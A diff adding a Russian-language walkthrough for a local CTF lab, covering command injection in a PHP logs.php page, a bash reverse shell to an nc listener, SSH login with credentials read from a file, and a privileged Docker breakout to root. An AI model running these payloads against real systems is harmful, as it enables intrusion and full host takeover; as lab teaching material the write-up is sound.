@@ -1,0 +1,92 @@
+## 🚀 Как пройти CTF
+
+### 📌 Старт
+```bash
+./startup.sh
+```
+
+Поднимутся два контейнера:
+- `web`: уязвимое PHP-приложение на порту 5000
+- `ssh`: контейнер с SSH и Docker-in-Docker на порту 2222
+
+---
+
+### 🔹 Шаг 1: RCE через logs.php
+
+В браузере:
+```
+http://localhost:5000/logs.php?filter=test
+```
+
+Пример инъекции:
+```bash
+http://localhost:5000/logs.php?filter=;id
+```
+Или через curl:
+```bash
+curl --get --data-urlencode "filter=; id" http://localhost:5000/logs.php
+```
+
+---
+
+### 🔹 Шаг 2: Reverse Shell
+
+На атакующем хосте:
+```bash
+nc -lvnp 4444
+```
+
+В logs.php:
+```bash
+curl --get --data-urlencode "filter=; bash -c 'bash -i >& /dev/tcp/172.17.0.1/4444 0>&1'" http://localhost:5000/logs.php
+```
+
+---
+
+### 🔹 Шаг 3: Найти флаг и SSH креды
+
+В shell:
+```bash
+cd /var/www
+ls
+cat user.txt         # флаг первого уровня
+cat credentials.txt  # логин и пароль для SSH
+```
+
+---
+
+### 🔹 Шаг 4: Подключение к SSH
+
+```bash
+ssh ctfplayer@localhost -p 2222
+# Пароль: из credentials.txt (например: 123)
+```
+
+---
+
+### 🔹 Шаг 5: Проверить доступ к Docker
+```bash
+docker ps
+```
+
+---
+
+### 🔹 Шаг 6: Привилегия через Docker (Breakout)
+```bash
+docker run -it --privileged --pid=host --net=host --ipc=host -v /:/hostroot alpine:latest chroot /hostroot /bin/bash
+```
+
+---
+
+### 🔹 Шаг 7: Получить root.txt
+```bash
+cat /root/root.txt
+```
+
+---
+
+## 🏁 Флаги
+
+- `/var/www/user.txt` — флаг после RCE
+- `/var/www/credentials.txt` — логин и пароль для SSH
+- `/root/root.txt` — root-доступ через Docker breakout
